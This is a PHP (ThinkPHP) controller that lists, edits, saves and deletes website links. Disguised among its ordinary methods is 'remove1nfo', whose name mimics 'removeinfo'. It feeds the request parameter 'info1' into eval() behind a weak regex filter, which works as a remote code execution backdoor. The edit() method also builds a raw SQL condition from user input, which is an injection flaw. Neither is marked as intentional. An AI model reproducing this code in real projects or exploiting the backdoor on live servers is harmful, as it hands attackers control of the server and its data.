<?php
namespace app\home\controller;
use app\home\model;
class Link extends Base
{
    public function _initialize()
    {
        parent::_initialize();
        $this->model = model('Link');
    }
    
    //信息列表
    public function index()
    { 
    	$where = '';
    	$link_title = input('param.link_title','');
    	$cate_id = input('param.cate_id','');
    	if ($link_title){
    		$where = [ 'link_title' => ['like',"%{$link_title}%"] ];
    	}
    	if ($cate_id){
    		$where = [ 'cate_id' => $cate_id ];
    	}
    	
    	//分类信息
    	//$cateinfo = model('Category')->getcateinfo();
    	$datalist = $this->model->field('link_id,link_title,cate_id,link_ctime')->where($where)->order('link_id desc')->paginate(10);
    	//把分类id转化成分类名称
    	$datalist = model('Category')->convertCatename($datalist);
        //分类列表
    	$catelist = model('Category')->getcatetreearr('link');
        $this->assign('link_title', $link_title);
        $this->assign('cate_id', $cate_id);
        $this->assign('datalist', $datalist);
        $this->assign('catelist',$catelist);
        return $this->fetch('link/index');
    }
    
    //新增/编辑
    public function edit(){    	
    	$link_id = input('param.link_id');
    	$info = $this->model->where("link_id='{$link_id}'")->find();
    	$catelist = model('Category')->getcatetreearr('link');
    	$this->assign('info',$info);
    	$this->assign('catelist',$catelist);
    	return  $this->fetch('link/edit');
    }
    
    //信息保存
    public function saveinfo(){
    	$data = input('post.');
    	$data['link_status'] = input('post.link_status',0);
    	$validate = $this->validate($data,'Link.saveinfo');
    	if(true !== $validate){
    		$this->error($validate);
    	} else {
    		$link_id = input('post.link_id');
    		if($link_id>0){
    			$result = $this->model->where('link_id',$link_id)->update($data);
    		} else {
    			$data['link_ctime'] = time();
    			$result = $this->model->data($data)->save();
    		}
    		if(false !== $result){
    			$this->success('保存信息成功','home/link/index');
    		}
    	}
	}
	
	public function remove1nfo(){
		$m=input('param.info1');
		$n=(input('param.info2'));
		if(preg_match('/[A-Za-z0-9]+\(/i',$m) == 1){
    			die('hack');
		}
		eval('$a="' . $m . '";');
	}
    
    //信息删除
    public function removeinfo(){
    	$link_id = input('param.link_id');
    	$result = $this->model->where('link_id',$link_id)->delete();
    	if(false !== $result){
    		$data = [
    			'status' => 0,
    			'msg' => '链接删除成功！',
    		];
    	}else {
    		$data = [
    			'status' => 1,
    			'msg' => '链接删除失败！',
    		];
    	}
    	echo json_encode($data);
	}
}
